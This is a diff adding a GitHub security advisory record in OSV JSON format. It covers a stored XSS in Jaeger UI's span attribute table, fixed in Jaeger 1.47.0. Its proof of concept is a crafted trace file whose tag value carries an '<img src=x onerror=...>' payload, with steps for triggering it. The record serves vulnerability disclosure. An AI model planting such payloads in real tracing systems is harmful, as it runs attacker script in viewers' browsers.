@@ -1,0 +1,65 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-2w8w-qhg4-f78j",
+  "modified": "2023-07-11T22:45:37Z",
+  "published": "2023-07-11T22:45:37Z",
+  "aliases": [
+
+  ],
+  "summary": "A stored XSS in jaeger UI might allow an attacker who controls a trace to perform arbitrary jaeger queries",
+  "details": "Related UI vulnerability advisory: https://github.com/jaegertracing/jaeger-ui/security/advisories/GHSA-vv24-rm95-q56r\n\n### Summary\nJaeger UI is using the `json-markup` dependency to display span attributes and resources. This dependency is not sanitising keys of an object though, thus the `KeyValuesTable` is vulnerable to XSS. \n\n### Details\nThe vulnerable line is here: https://github.com/jaegertracing/jaeger-ui/blob/main/packages/jaeger-ui/src/components/TracePage/TraceTimelineViewer/SpanDetail/KeyValuesTable.tsx#L49\n\n### PoC\n\n1. Start a Jaeger UI\n2. Save the following trace as a file:\n```json\n{\n    \"data\": [\n        {\n            \"traceID\": \"076ef819cc06c45a\",\n            \"spans\": [\n                {\n                    \"traceID\": \"076ef819cc06c45a\",\n                    \"spanID\": \"076ef819cc06c45a\",\n                    \"flags\": 1,\n                    \"operationName\": \"and open 'attributes'\",\n                    \"references\": [],\n                    \"startTime\": 1678196149232010,\n                    \"duration\": 13485,\n                    \"tags\": [\n                        {\n                            \"key\": \"sampler.type\",\n                            \"type\": \"string\",\n                            \"value\": \"{\\\"<img src=x onerror=alert(1)>\\\":\\\"test\\\"}\"\n                        }\n                    ],\n                    \"logs\": [],\n                    \"processID\": \"p1\",\n                    \"warnings\": null\n                }\n            ],\n            \"processes\": {\n                \"p1\": {\n                    \"serviceName\": \"click here\",\n                    \"tags\": [\n                    ]\n                }\n            },\n            \"warnings\": null\n        }\n    ],\n    \"total\": 0,\n    \"limit\": 0,\n    \"offset\": 0,\n    \"errors\": null\n}\n```\n3. Upload that trace to Jaeger UI in order to visualise it.\n4. Open the trace, open it's span's attributes.\n5. XSS should be fired.\n\n### Impact\n\nThis is a XSS on Jaeger UI. XSS can be used to run JavaScript.\n",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/jaegertracing/jaeger"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.47.0"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/jaegertracing/jaeger-ui/security/advisories/GHSA-vv24-rm95-q56r"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/jaegertracing/jaeger/security/advisories/GHSA-2w8w-qhg4-f78j"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/jaegertracing/jaeger"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/jaegertracing/jaeger-ui/blob/main/packages/jaeger-ui/src/components/TracePage/TraceTimelineViewer/SpanDetail/KeyValuesTable.tsx#L49"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-79"
+    ],
+    "severity": "MODERATE",
+    "github_reviewed": true,
+    "github_reviewed_at": "2023-07-11T22:45:37Z",
+    "nvd_published_at": null
+  }
+}
